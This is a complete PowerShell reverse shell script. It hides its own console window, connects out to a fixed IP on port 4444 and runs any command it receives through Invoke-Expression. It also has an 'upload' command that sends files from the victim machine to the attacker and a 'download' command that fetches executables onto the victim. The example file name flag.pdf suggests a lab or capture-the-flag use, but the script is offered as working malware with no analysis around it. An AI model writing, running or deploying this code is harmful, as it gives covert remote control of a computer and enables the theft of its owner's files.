$ip = "192.168.150.4"
$port = 4444

# Import API functions for window hiding
Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
"@ -Namespace Win32Functions -Name NativeMethods

# Hide console window
$consoleWindow = [Win32Functions.NativeMethods]::GetConsoleWindow()
[Win32Functions.NativeMethods]::ShowWindowAsync($consoleWindow, 0)

# Function: Upload file from victim to attacker
function Send-File {
    param([string]$filePath)
    
    if (Test-Path $filePath) {
        # Read file as bytes (supports binary)
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        # Convert to Base64 for safe transmission
        $b64 = [Convert]::ToBase64String($bytes)
        
        # Send header with file info
        $header = "FILE_START|$filePath|$($bytes.Length)"
        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header + "`n")
        $stream.Write($headerBytes, 0, $headerBytes.Length)
        
        # Send the Base64 content in chunks (avoids memory issues)
        $chunkSize = 4096
        for ($i = 0; $i -lt $b64.Length; $i += $chunkSize) {
            $chunk = $b64.Substring($i, [Math]::Min($chunkSize, $b64.Length - $i))
            $chunkBytes = [System.Text.Encoding]::UTF8.GetBytes($chunk)
            $stream.Write($chunkBytes, 0, $chunkBytes.Length)
            Start-Sleep -Milliseconds 10  # Small delay to prevent flooding
        }
        
        # Send footer
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`nFILE_END")
        $stream.Write($footerBytes, 0, $footerBytes.Length)
        $stream.Flush()
        
        return $true
    } else {
        $errorMsg = "ERROR|File not found: $filePath`n"
        $errorBytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
        $stream.Write($errorBytes, 0, $errorBytes.Length)
        $stream.Flush()
        return $false
    }
}

# Function: Download file from attacker to victim
function Receive-File {
    param([string]$url, [string]$destinationPath)
    
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $destinationPath)
        
        $successMsg = "SUCCESS|Downloaded to $destinationPath`n"
        $successBytes = [System.Text.Encoding]::UTF8.GetBytes($successMsg)
        $stream.Write($successBytes, 0, $successBytes.Length)
        $stream.Flush()
        return $true
    } catch {
        $errorMsg = "ERROR|Download failed: $($_.Exception.Message)`n"
        $errorBytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
        $stream.Write($errorBytes, 0, $errorBytes.Length)
        $stream.Flush()
        return $false
    }
}

# Function: Save Base64 data to file (for receiving files from attacker)
function Save-Base64File {
    param([string]$b64Data, [string]$destinationPath)
    
    try {
        $bytes = [Convert]::FromBase64String($b64Data)
        [System.IO.File]::WriteAllBytes($destinationPath, $bytes)
        
        $successMsg = "SUCCESS|File saved to $destinationPath`n"
        $successBytes = [System.Text.Encoding]::UTF8.GetBytes($successMsg)
        $stream.Write($successBytes, 0, $successBytes.Length)
        $stream.Flush()
        return $true
    } catch {
        $errorMsg = "ERROR|Failed to save: $($_.Exception.Message)`n"
        $errorBytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
        $stream.Write($errorBytes, 0, $errorBytes.Length)
        $stream.Flush()
        return $false
    }
}

# Main reverse shell with file transfer support
try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $networkBuffer = New-Object Byte[] 65536
    $reader = New-Object System.IO.StreamReader($stream)
    
    # Send initial connection message
    $initMsg = "[+] Connected to $ip`: $port`nType 'help' for commands`n"
    $initBytes = [System.Text.Encoding]::UTF8.GetBytes($initMsg)
    $stream.Write($initBytes, 0, $initBytes.Length)
    $stream.Flush()
    
    while (($data = $stream.Read($networkBuffer, 0, $networkBuffer.Length)) -gt 0) {
        $command = [System.Text.Encoding]::UTF8.GetString($networkBuffer, 0, $data).Trim()
        
        # Parse custom commands for file transfer
        if ($command -match "^upload (.+)$") {
            # Upload file from victim to attacker
            $filePath = $matches[1]
            Send-File $filePath
        }
        elseif ($command -match "^download (.+) (.+)$") {
            # Download file from URL to victim
            $url = $matches[1]
            $dest = $matches[2]
            Receive-File $url $dest
        }
        elseif ($command -match "^sendbase64 (.+) (.+)$") {
            # Receive Base64 data and save as file
            $b64 = $matches[1]
            $dest = $matches[2]
            Save-Base64File $b64 $dest
        }
        elseif ($command -eq "help") {
            $help = @"
Available commands:
  upload C:\path\to\file     - Send file to attacker
  download URL C:\dest\path   - Download file from URL
  sendbase64 BASE64_DATA PATH - Save Base64 as file
  Any other command           - Execute in PowerShell

Examples:
  upload C:\Users\Desktop\flag.pdf
  download http://192.168.150.4:8080/tool.exe C:\temp\tool.exe
  whoami
  dir C:\
"@
            $helpBytes = [System.Text.Encoding]::UTF8.GetBytes($help + "`n")
            $stream.Write($helpBytes, 0, $helpBytes.Length)
            $stream.Flush()
        }
        else {
            # Normal command execution
            try {
                $cmdOutput = Invoke-Expression $command 2>&1 | Out-String
                if ($cmdOutput -eq "") { $cmdOutput = "Command executed (no output)`n" }
                $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($cmdOutput)
                $stream.Write($responseBytes, 0, $responseBytes.Length)
                $stream.Flush()
            } catch {
                $errorMsg = "ERROR: $($_.Exception.Message)`n"
                $errorBytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
                $stream.Write($errorBytes, 0, $errorBytes.Length)
                $stream.Flush()
            }
        }
    }
} catch {
    # Connection failed - silently exit
    exit
} finally {
    if ($client) { $client.Close() }
}